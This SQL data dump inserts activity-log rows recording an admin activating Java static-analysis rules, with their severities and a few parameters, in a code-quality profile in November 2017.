INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2264, '2017-11-20 11:14:45.384', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2583;ruleKey=squid:S2583;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzoIbbGRdfPp-rA8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2265, '2017-11-20 11:14:45.417', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2589;ruleKey=squid:S2589;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzopbbGRdfPp-rA9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2266, '2017-11-20 11:14:45.445', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2629;ruleKey=squid:S2629;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzpFbbGRdfPp-rA-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2267, '2017-11-20 11:14:45.483', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2637;ruleKey=squid:S2637;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzprbbGRdfPp-rA_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2268, '2017-11-20 11:14:45.511', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2638;ruleKey=squid:S2638;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzqHbbGRdfPp-rBA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2269, '2017-11-20 11:14:45.528', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2639;ruleKey=squid:S2639;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzqYbbGRdfPp-rBB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2270, '2017-11-20 11:14:45.546', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2653;ruleKey=squid:S2653;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzqqbbGRdfPp-rBC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2271, '2017-11-20 11:14:45.569', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2674;ruleKey=squid:S2674;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzrBbbGRdfPp-rBD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2272, '2017-11-20 11:14:45.596', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2675;ruleKey=squid:S2675;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzrcbbGRdfPp-rBE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2273, '2017-11-20 11:14:45.622', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2676;ruleKey=squid:S2676;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzr2bbGRdfPp-rBF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2274, '2017-11-20 11:14:45.66', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2677;ruleKey=squid:S2677;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzscbbGRdfPp-rBG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2275, '2017-11-20 11:14:45.679', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2681;ruleKey=squid:S2681;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzsvbbGRdfPp-rBH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2276, '2017-11-20 11:14:45.703', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2692;ruleKey=squid:S2692;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIztHbbGRdfPp-rBI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2277, '2017-11-20 11:14:45.73', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2695;ruleKey=squid:S2695;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIztibbGRdfPp-rBJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2278, '2017-11-20 11:14:45.748', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2696;ruleKey=squid:S2696;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzt0bbGRdfPp-rBK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2279, '2017-11-20 11:14:45.764', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2718;ruleKey=squid:S2718;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzuEbbGRdfPp-rBL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2280, '2017-11-20 11:14:45.787', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2737;ruleKey=squid:S2737;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzubbbGRdfPp-rBM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2281, '2017-11-20 11:14:45.803', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2757;ruleKey=squid:S2757;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzurbbGRdfPp-rBN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2282, '2017-11-20 11:14:45.824', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2786;ruleKey=squid:S2786;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzvAbbGRdfPp-rBO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2283, '2017-11-20 11:14:45.854', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2789;ruleKey=squid:S2789;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzvebbGRdfPp-rBP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2284, '2017-11-20 11:14:45.878', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2864;ruleKey=squid:S2864;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzv2bbGRdfPp-rBQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2285, '2017-11-20 11:14:45.89', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2885;ruleKey=squid:S2885;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzwCbbGRdfPp-rBR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2286, '2017-11-20 11:14:45.922', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2886;ruleKey=squid:S2886;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzwibbGRdfPp-rBS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2287, '2017-11-20 11:14:45.94', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2912;ruleKey=squid:S2912;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzw0bbGRdfPp-rBT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2288, '2017-11-20 11:14:45.964', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2924;ruleKey=squid:S2924;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzxMbbGRdfPp-rBU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2289, '2017-11-20 11:14:45.992', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2925;ruleKey=squid:S2925;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzxobbGRdfPp-rBV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2290, '2017-11-20 11:14:46.018', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2970;ruleKey=squid:S2970;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzyCbbGRdfPp-rBW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2291, '2017-11-20 11:14:46.034', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2975;ruleKey=squid:S2975;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzySbbGRdfPp-rBX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2292, '2017-11-20 11:14:46.071', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2976;ruleKey=squid:S2976;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzy3bbGRdfPp-rBY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2293, '2017-11-20 11:14:46.113', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3008;ruleKey=squid:S3008;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzzhbbGRdfPp-rBZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2294, '2017-11-20 11:14:46.207', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3010;ruleKey=squid:S3010;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz0_bbGRdfPp-rBa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2295, '2017-11-20 11:14:46.235', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3020;ruleKey=squid:S3020;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz1bbbGRdfPp-rBb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2296, '2017-11-20 11:14:46.296', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3027;ruleKey=squid:S3027;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz2YbbGRdfPp-rBc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2297, '2017-11-20 11:14:46.327', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3034;ruleKey=squid:S3034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz23bbGRdfPp-rBd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2298, '2017-11-20 11:14:46.372', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3038;ruleKey=squid:S3038;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz3kbbGRdfPp-rBe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2299, '2017-11-20 11:14:46.425', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3042;ruleKey=squid:S3042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz4ZbbGRdfPp-rBf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2300, '2017-11-20 11:14:46.462', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3046;ruleKey=squid:S3046;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz4-bbGRdfPp-rBg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2301, '2017-11-20 11:14:46.478', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3066;ruleKey=squid:S3066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz5ObbGRdfPp-rBh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2302, '2017-11-20 11:14:46.502', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3067;ruleKey=squid:S3067;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz5mbbGRdfPp-rBi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2303, '2017-11-20 11:14:46.536', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3281;ruleKey=squid:S3281;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz6IbbGRdfPp-rBj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2304, '2017-11-20 11:14:46.568', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3346;ruleKey=squid:S3346;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz6nbbGRdfPp-rBk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2305, '2017-11-20 11:14:46.595', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3355;ruleKey=squid:S3355;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz7DbbGRdfPp-rBl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2306, '2017-11-20 11:14:46.623', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3358;ruleKey=squid:S3358;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz7fbbGRdfPp-rBm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2307, '2017-11-20 11:14:46.641', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3398;ruleKey=squid:S3398;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz7xbbGRdfPp-rBn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2308, '2017-11-20 11:14:46.666', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3400;ruleKey=squid:S3400;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz8KbbGRdfPp-rBo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2309, '2017-11-20 11:14:46.696', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3415;ruleKey=squid:S3415;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz8obbGRdfPp-rBp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2310, '2017-11-20 11:14:46.723', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3421;ruleKey=squid:S3421;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz9DbbGRdfPp-rBq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2311, '2017-11-20 11:14:46.749', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3422;ruleKey=squid:S3422;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz9dbbGRdfPp-rBr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2312, '2017-11-20 11:14:46.775', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3436;ruleKey=squid:S3436;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz93bbGRdfPp-rBs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2313, '2017-11-20 11:14:46.81', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3437;ruleKey=squid:S3437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz-abbGRdfPp-rBt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2314, '2017-11-20 11:14:46.835', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3438;ruleKey=squid:S3438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz-zbbGRdfPp-rBu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2315, '2017-11-20 11:14:46.889', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3457;ruleKey=squid:S3457;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIz_pbbGRdfPp-rBv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2316, '2017-11-20 11:14:46.932', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3516;ruleKey=squid:S3516;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0AUbbGRdfPp-rBw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2317, '2017-11-20 11:14:46.971', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3518;ruleKey=squid:S3518;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0A7bbGRdfPp-rBx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2318, '2017-11-20 11:14:46.998', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3599;ruleKey=squid:S3599;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0BWbbGRdfPp-rBy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2319, '2017-11-20 11:14:47.057', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3631;ruleKey=squid:S3631;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0CRbbGRdfPp-rBz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2320, '2017-11-20 11:14:47.125', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3655;ruleKey=squid:S3655;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0DVbbGRdfPp-rB0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2321, '2017-11-20 11:14:47.179', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3725;ruleKey=squid:S3725;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0ELbbGRdfPp-rB1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2322, '2017-11-20 11:14:47.285', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3776;ruleKey=squid:S3776;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0F1bbGRdfPp-rB2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2323, '2017-11-20 11:14:47.365', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3824;ruleKey=squid:S3824;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0HFbbGRdfPp-rB3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2324, '2017-11-20 11:14:47.41', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3878;ruleKey=squid:S3878;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0HybbGRdfPp-rB4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2325, '2017-11-20 11:14:47.454', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S3923;ruleKey=squid:S3923;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZI0IebbGRdfPp-rB5');
